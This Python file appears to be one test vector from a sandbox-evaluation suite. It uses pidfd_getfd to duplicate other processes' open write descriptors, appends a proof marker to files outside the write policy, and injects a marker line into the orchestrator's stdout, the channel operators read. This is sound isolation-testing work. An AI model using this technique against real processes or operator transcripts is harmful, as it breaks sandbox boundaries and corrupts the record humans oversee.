"""V29 — foreign-fd content write: the duplicated descriptor gets used.

V21 proved `pidfd_getfd` duplicates other processes' descriptors and stopped
at fstat. V5 proved `/proc/<pid>/fd/N` opens for write and stopped at the
open. This vector takes the step both were built for: content. For every
visible process it reads the fd table (readlink for the target, fdinfo for
the open flags), and when the target holds a regular file open for write on
a path outside the policy's write roots, it duplicates that descriptor with
`pidfd_getfd` and appends a one-line `SAND_EVAL_POC` marker. The write is
made only through descriptors that carry `O_APPEND`, so it can never
overwrite victim data; a write-mode fd without `O_APPEND` is reported as a
capability but deliberately left unwritten, because writes through it would
land at the victim's shared file offset.

The orchestrator's stdout (pid 1 fd 1) gets the same one-line marker: it is
the control channel the operator reads, and the marker is the proof that
transcript injection needs no `--arm` and no vulnerability in the agent. Pid
1's stdin is never written by this vector, because that is the daemon's
command stream.
"""
import os
import time

try:
    from sandeval.base import Result, Status, Vector, errno_name
except ImportError:
    from base import Result, Status, Vector, errno_name  # type: ignore

try:
    from _common import (
        MARKER,
        fd_inventory,
        is_regular_path,
        libc,
        marker_line,
        raw_syscall,
        visible_pids,
    )
except ImportError:
    from _common import (  # type: ignore
        MARKER,
        fd_inventory,
        is_regular_path,
        libc,
        marker_line,
        raw_syscall,
        visible_pids,
    )

SYS_PIDFD_OPEN = 434
SYS_PIDFD_GETFD = 438
O_APPEND = os.O_APPEND


class ForeignFdWriteVector(Vector):
    id = "V29"
    title = "foreign-fd content write (pidfd_getfd into daemon-held files)"
    severity = "ship-blocker"
    maps_to = "P2 / P12 / V5 / V21"
    description = __doc__
    host_verify = "verify.sh (greps SAND_EVAL_POC in the named host files)"

    def check(self, ctx):
        pids = visible_pids(limit=24)
        if 1 not in pids and os.path.exists("/proc/1"):
            pids.insert(0, 1)
        if not pids:
            return Result(Status.SKIP, "no other process visible in /proc")
        try:
            libc()
        except OSError as exc:
            return Result(Status.SKIP, f"no libc to call syscalls through: {errno_name(exc)}")

        candidates, dup_denied, info_dups = [], {}, []
        for pid in pids:
            for entry in fd_inventory(pid):
                target, flags = entry["target"], entry["flags"]
                if flags is None or not is_regular_path(target):
                    continue
                if (flags & os.O_ACCMODE) not in (os.O_WRONLY, os.O_RDWR):
                    continue
                if os.path.basename(target).endswith((".lock", ".pid")):
                    continue
                # The transcript pipe of the orchestrator is a separate class.
                candidates.append({"pid": pid, "fd": entry["fd"], "path": target, "flags": flags})

        file_targets = [c for c in candidates if not ctx.policy_writable(c["path"])]
        in_policy = [c for c in candidates if ctx.policy_writable(c["path"])]
        for c in in_policy[:4]:
            info_dups.append(f"pid {c['pid']} fd {c['fd']} -> {c['path']} (in policy)")

        landed, capable_unwritten, eligible = [], [], 0
        for c in file_targets[:8]:
            dup = self._dup_fd(c["pid"], c["fd"])
            if dup is None:
                dup_denied[f"pid {c['pid']} fd {c['fd']}"] = self._dup_err
                continue
            try:
                st = os.fstat(dup)
            except OSError as exc:
                os.close(dup)
                dup_denied[f"pid {c['pid']} fd {c['fd']}"] = f"fstat: {errno_name(exc)}"
                continue
            entry = {"pid": c["pid"], "fd": c["fd"], "path": c["path"],
                     "size_before": st.st_size, "uid": st.st_uid, "mode": oct(st.st_mode & 0o777)}
            eligible += 1
            if not (c["flags"] & O_APPEND):
                entry["why_not"] = "no O_APPEND: victim data would be overwritten at the shared offset"
                capable_unwritten.append(entry)
                os.close(dup)
                continue
            if st.st_size == 0:
                entry["why_not"] = "size 0 (fresh lock/log semantics); marker withheld"
                capable_unwritten.append(entry)
                os.close(dup)
                continue
            payload = marker_line("V29", f"pid={c['pid']} fd={c['fd']} target={c['path']}").encode()
            try:
                os.write(dup, payload)
            except OSError as exc:
                entry["why_not"] = f"write: {errno_name(exc)}"
                capable_unwritten.append(entry)
                os.close(dup)
                continue
            time.sleep(0.05)
            st2 = os.fstat(dup)
            entry["written"] = len(payload)
            entry["size_after"] = st2.st_size
            entry["delta"] = st2.st_size - st.st_size
            landed.append(entry)
            os.close(dup)

        pipe = self._transcript_pipe(ctx)
        pipe_note = ""
        if pipe:
            ok, why = pipe
            pipe_note = f"; orchestrator stdout: {'marker written' if ok else why}"

        detail = {
            "candidates": len(candidates),
            "eligible": eligible,
            "landed": landed,
            "capable_unwritten": capable_unwritten,
            "dup_denied": dup_denied,
            "in_policy_dups": info_dups,
            "marker": MARKER,
        }
        if landed:
            shown = "; ".join(f"{l['path']} (+{l['delta']}B via pid {l['pid']} fd {l['fd']})" for l in landed[:3])
            return Result(
                Status.FAIL,
                f"content written to {len(landed)} out-of-policy file(s) via duplicated foreign fd: {shown}{pipe_note}",
                detail,
            )
        if pipe and pipe[0]:
            return Result(
                Status.FAIL,
                "orchestrator transcript injection: SAND_EVAL_POC written to pid 1 fd 1 "
                "(no out-of-policy regular file was open for append this run)",
                detail,
            )
        if capable_unwritten or eligible:
            why = capable_unwritten[0].get("why_not", "dup ok") if capable_unwritten else "no append-mode fd"
            return Result(
                Status.SUSPECTED,
                f"{eligible} foreign write-fd(s) duplicated but not written ({why}); "
                "the write primitive is reachable, the marker was withheld on purpose",
                detail,
            )
        if dup_denied and not candidates:
            return Result(Status.PASS, f"no foreign fd duplicated ({list(dup_denied)[:2]})", detail)
        if dup_denied and not eligible and not capable_unwritten:
            return Result(
                Status.PASS,
                f"write-mode foreign fds exist but every pidfd_getfd was denied "
                f"({sorted(set(dup_denied.values()))[:2]})",
                detail,
            )
        return Result(
            Status.PASS,
            "no process holds a write-mode fd to an out-of-policy regular file; nothing to inject",
            detail,
        )

    def cleanup(self, ctx):
        # Appends cannot be undone from here; host-verify reports the markers
        # and documents that. Nothing this vector creates needs unlinking.
        return Result(Status.INFO, "marker appends are permanent by design; see verify.sh")

    def _dup_fd(self, pid, fd):
        """pidfd_open+pidfd_getfd; returns the dup or None (sets _dup_err)."""
        pd, err = raw_syscall(SYS_PIDFD_OPEN, pid, 0)
        if pd < 0:
            self._dup_err = errno_name(err)
            return None
        dup, err = raw_syscall(SYS_PIDFD_GETFD, pd, fd, 0)
        os.close(pd)
        if dup < 0:
            self._dup_err = errno_name(err)
            return None
        self._dup_err = "ok"
        return dup

    def _transcript_pipe(self, ctx):
        """One marker line to pid 1 fd 1 when that fd is a pipe. Never fd 0."""
        if os.path.exists("/proc/1/fd/1"):
            try:
                if not os.readlink("/proc/1/fd/1").startswith("pipe:"):
                    return False, "pid 1 fd 1 is not a pipe"
            except OSError as exc:
                return False, errno_name(exc)
            dup = self._dup_fd(1, 1)
            if dup is None:
                return False, f"dup denied: {self._dup_err}"
            try:
                os.write(dup, marker_line("V29", "target=pid1-stdout").encode())
                return True, ""
            except OSError as exc:
                return False, errno_name(exc)
            finally:
                os.close(dup)
        return False, "pid 1 not visible"

    # Pid 1's stdin is the daemon's command stream and is NEVER written by
    # this vector: marker lines go to the transcript (fd 1) only.


VECTOR = ForeignFdWriteVector()
